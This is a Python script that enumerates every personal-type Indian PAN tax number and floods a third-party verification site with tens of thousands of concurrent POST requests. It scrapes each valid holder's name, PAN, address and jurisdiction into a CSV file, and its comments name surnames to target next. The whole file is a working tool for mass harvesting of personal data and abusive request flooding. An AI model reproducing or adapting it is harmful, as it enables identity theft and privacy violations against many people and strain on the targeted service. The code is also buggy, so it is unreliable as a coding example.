from bs4 import BeautifulSoup as soup
import gevent
import grequests
import urllib
import re
import os
from tornado import ioloop, httpclient
import time
import concurrent.futures
import urllib.request
import itertools
import sys

#-------------------------------------------------------
#Important!!!
#ulimit -Sn 65000
#-------------------------------------------------------

start_time = time.time()
RequestingSPEED = 50000
urls = ['http://searchpan.in/verification_process_run10.php']*RequestingSPEED
print ('Reuqesting at ' + str(len(urls)) + ' requests!!!!')
PeopleData = "PeopleData.csv"
i = 0
ccccc = 0
#Pan = ['ABCDE1234A','AAAPA1113A', 'AAAPA0056A', 'AAAPA0248A', 'AAAPA0397A', 'AAAPA0535A', 'AAAPA0577A', 'AAAPA0638A', 'AAAPA0707A', 'AAAPA1002A', ' AAAPA1034A']
def DataInsersion(DataArg, PanNumber):
	if 'Invalid PAN' in str(DataArg):
		print("Invalid Pan:" + PanNumber)
		#print('FOUND INVALID PAN')
		#print(DataArg)
	elif str(DataArg) == '':
		print("Invalid Pan:" + PanNumber)
		#print('FOUND INVALID PAN')
		#print(DataArg)
	else:
		PAN = ''
		Name = '' 
		Address = ''
		AreaCode = ''
		Jurisdication = ''
		breakn = False
		try:
			Name = str(DataArg.find('span', {"class": "sn"}).text + ' ' + DataArg.find('span', {"class": "fn"}).text + ' ' + DataArg.find('span', {"class": "mn"}).text) 
		except:
			breakn = True
			pass

		if(breakn == False):
			td = DataArg.findAll('td')
			PAN = str(td[0])
			PAN = PAN.replace('<td>', '')
			PAN = PAN[0:10]
			PAN = PAN.strip()
			print()
			print('Found valid PAN!!!!')
			print()
			print(PAN)
			print()
			print(DataArg)
			print()
			Address = td[4]
			Address = str(Address)
			Address = Address.replace('<td>', '')
			Address = Address.replace('</td>', '')
			Address = Address.replace('<br/>', ' ')
			Address = Address.replace(',', '')
			' '.join(Address.split())
			Address = Address.strip()
			AreaCode = str(td[2]).strip()
			AreaCode = AreaCode.replace('<td>', '')
			AreaCode = AreaCode.replace('</td>', '')
			AreaCode = AreaCode.replace(',', '')
			' '.join(AreaCode.split())
			Jurisdication = str(td[3]).strip()
			Jurisdication = Jurisdication.replace('<td>', '')
			Jurisdication = Jurisdication.replace('</td>', '')
			Jurisdication = Jurisdication.replace(',', '')
			' '.join(Jurisdication.split())
			AreaCode = AreaCode.replace('<td>', '')
			AreaCode = AreaCode.replace('</td>', '')
			FinalOutString = str(Name) + ', ' + str(PAN) + ', ' + str(Address) + ', ' + str(AreaCode) + ', ' + str(Jurisdication) + '\n' 
			print(FinalOutString)
			readingFile = open(PeopleData, "r").readlines()
			readingFile = readingFile[-1]
			readingFile = readingFile.split(',')
			NewPeopleData = open(PeopleData, "a")
			NewPeopleData.write(FinalOutString)
			NewPeopleData.close()


def ParseDataInFile(Pan):
	def load_url(url, timeout):
		currentPan = Pan[counter]
		Payload = {
				"panlist" : currentPan,
				"SUBMIT": "Submit"
			}
		PayloadArgs = urllib.parse.urlencode(Payload)
		conn = urllib.request.urlopen(url, PayloadArgs.encode("utf-8"))
		DataArgs = soup(conn, "lxml")
		return DataArgs

	counter = 0
	with concurrent.futures.ThreadPoolExecutor(max_workers=250) as executor:
	    future_to_url = {executor.submit(load_url, url, 60): url for url in urls}
	    for future in concurrent.futures.as_completed(future_to_url):
	        url = future_to_url[future]
	        try:
	            data = future.result()
	            DataInsersion(data, Pan[counter])
	            counter+=1
	        except Exception as exc:
	            print('%r generated an exception: %s' % (url, exc))
	            print("Counter is: " + str(Pan[counter]))
	print (time.time() - start_time)


Pan = ''
PanList = []
alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
digits = ['0','1','2','3','4','5','6','7','8','9']
global AlphaCount
def main(StartingPan):
	Continue = False
	AlphaCount = 1
	for AlphaBets in itertools.product(alphabet,repeat=5):
		for Num in itertools.product(digits,repeat=4):
			Pan = str(str(AlphaBets[0]) + str(AlphaBets[1]) + str(AlphaBets[2]) + 'P' + str(AlphaBets[3]) + str(Num[0]) + str(Num[1]) + str(Num[2]) + str(Num[3]) + str(AlphaBets[4]))
			if (len(PanList)) == RequestingSPEED:
				print("----------------------------------------------------------")
				print("Started to send requests for this block of " + str(RequestingSPEED))
				ParseDataInFile(PanList)
				print("Data Saved to File")
				print("----------------------------------------------------------\n")
				del PanList[:]
			elif Pan == StartingPan:
				Continue = True
				PanList.append(Pan)
			elif Continue == True:
				Continue = True
				PanList.append(Pan)
			else:
				pass

main('AAAPJ3212U')
#Next is with Sharma or Shau
#if doesnt work, try, AAAPT1231F
